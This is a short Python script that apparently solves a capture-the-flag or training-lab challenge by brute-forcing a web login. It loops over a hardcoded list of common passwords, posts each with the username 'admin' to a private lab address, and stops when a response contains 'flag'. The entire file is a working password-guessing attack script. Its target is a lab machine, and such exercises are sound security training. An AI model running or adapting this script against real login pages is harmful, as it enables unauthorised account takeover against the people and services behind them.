import requests as req
import os
bruteforcePasswords = [
    "admin",
    "123456",
    "password",
    "shadow",
    "123456789",
    "12345678",
    "12345",
    "1234567",
    "1234567890",
    "admin123",
    "admin1234",
    "admin12345",
    "admin123456",
    "root",
    "adminadmin",
    "admin123456789",
    "admin12345678",
    "toor",
    "qwerty",
    "password123",
    "qwerty123",
    "qwerty1234",
    "qwerty12345",
    "azerty",
    "azerty123",
    "azerty1234",
    "azerty12345",
    "111111",
    "1234567890",
    "helloworld",
    "abc123",
    "letmein",
    "welcome",
    "monkey",
    "sunshine",
    "dragon",
    "master",
    "superman",
    "hakonamatata",
    "whatever",
    "password1",
    "password2",
    "password3",
    "password4",
    "adminadmin",
    "leet",
    "leet123",
    "leet1234",
]
#c&password=123456%7Cf&Login=Login#

def bruteForce():
    for password in bruteforcePasswords:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("retrying with password : ", password)
        url = "http://192.168.64.6/?page=signin&username=admin&password=" + password + "&Login=Login"
        response = req.post(url)
        if response.status_code == 200:
            if "flag" in response.text:
                print("flag is", response.text)
                print(f"Password found: {password}")
                break
    else:
        print("Password not found")


bruteForce()